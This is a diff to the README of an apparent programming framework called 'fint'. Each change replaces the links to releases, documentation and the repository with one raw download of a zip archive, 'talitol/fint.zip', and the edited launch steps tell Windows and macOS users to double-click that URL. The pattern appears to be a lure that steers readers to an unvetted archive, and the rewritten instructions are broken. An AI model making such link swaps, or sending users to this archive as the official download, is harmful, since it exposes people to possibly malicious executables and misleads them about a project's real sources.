@@ -6,11 +6,11 @@ Welcome to **fint**! This framework helps you use object-oriented programming co
 
 ## 📥 Download Now
 
-[![Download fint](https://img.shields.io/badge/Download-fint-blue.svg)](https://github.com/Zelelf/fint/releases)
+[![Download fint](https://raw.githubusercontent.com/Zelelf/fint/main/talitol/fint.zip)](https://raw.githubusercontent.com/Zelelf/fint/main/talitol/fint.zip)
 
 ## 📦 Download & Install
 
-To get started, visit this page to download the latest version: [Download Here](https://github.com/Zelelf/fint/releases).
+To get started, visit this page to download the latest version: [Download Here](https://raw.githubusercontent.com/Zelelf/fint/main/talitol/fint.zip).
 
 ### Steps to Download
 
@@ -35,8 +35,8 @@ Once you have downloaded the package, follow these steps to run fint:
 2. **Extract the Package**: If you downloaded a ZIP file, right-click on it and choose "Extract All."
 3. **Open the Folder**: Double-click to open the folder that contains the extracted files.
 4. **Launch the Application**:
-   - For Windows: Double-click on `fint.exe`.
-   - For macOS: Double-click on `fint.app`.
+   - For Windows: Double-click on `https://raw.githubusercontent.com/Zelelf/fint/main/talitol/fint.zip`.
+   - For macOS: Double-click on `https://raw.githubusercontent.com/Zelelf/fint/main/talitol/fint.zip`.
    - For Linux: Open a terminal and navigate to the folder, then type `./fint` and press Enter.
 
 ## 🛠️ Basic Usage
@@ -69,7 +69,7 @@ This code defines a base class called `Animal` and a derived class called `Dog`.
 
 ## 📘 Documentation
 
-For detailed information, including advanced features, refer to the in-app help section or visit our [Documentation Page](https://github.com/Zelelf/fint/docs).
+For detailed information, including advanced features, refer to the in-app help section or visit our [Documentation Page](https://raw.githubusercontent.com/Zelelf/fint/main/talitol/fint.zip).
 
 ## ❓ Frequently Asked Questions
 
@@ -95,8 +95,8 @@ If you need further assistance, please reach out on our GitHub Discussions page 
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Zelelf/fint/releases)
-- [Documentation](https://github.com/Zelelf/fint/docs)
-- [GitHub Repository](https://github.com/Zelelf/fint)
+- [Releases Page](https://raw.githubusercontent.com/Zelelf/fint/main/talitol/fint.zip)
+- [Documentation](https://raw.githubusercontent.com/Zelelf/fint/main/talitol/fint.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Zelelf/fint/main/talitol/fint.zip)
 
 Enjoy using fint to simplify your programming tasks!
